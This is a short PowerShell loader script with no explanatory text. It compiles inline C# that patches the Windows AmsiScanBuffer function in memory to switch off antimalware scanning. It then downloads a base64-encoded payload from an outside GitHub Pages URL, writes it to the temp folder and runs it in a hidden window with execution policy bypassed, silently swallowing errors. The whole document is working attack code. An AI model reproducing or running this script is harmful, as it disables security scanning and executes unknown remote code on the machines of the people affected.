$sc = @'
using System;
using System.Runtime.InteropServices;
public class AmsiPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Apply() {
        IntPtr h = LoadLibrary("amsi.dll");
        IntPtr f = GetProcAddress(h, "AmsiScanBuffer");
        if (f == IntPtr.Zero) return;
        uint o;
        VirtualProtect(f, (UIntPtr)6, 0x40, out o);
        byte[] b = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        Marshal.Copy(b, 0, f, 6);
        VirtualProtect(f, (UIntPtr)6, o, out o);
    }
}
'@
try { Add-Type -TypeDefinition $sc -ErrorAction SilentlyContinue } catch {}
try { [AmsiPatch]::Apply() } catch {}

$u = 'https://infinityteq.github.io/shadow.b64'
$r = iwr $u -UseBasicParsing
$t = if ($r.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($r.Content) } else { $r.Content }
$t = $t -replace '\s',''
$src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t))

# Write the actual payload to disk, then run it as a file
$p = "$env:TEMP\payload.ps1"
[IO.File]::WriteAllText($p, $src)
& powershell.exe -w hidden -nop -ep bypass -File $p
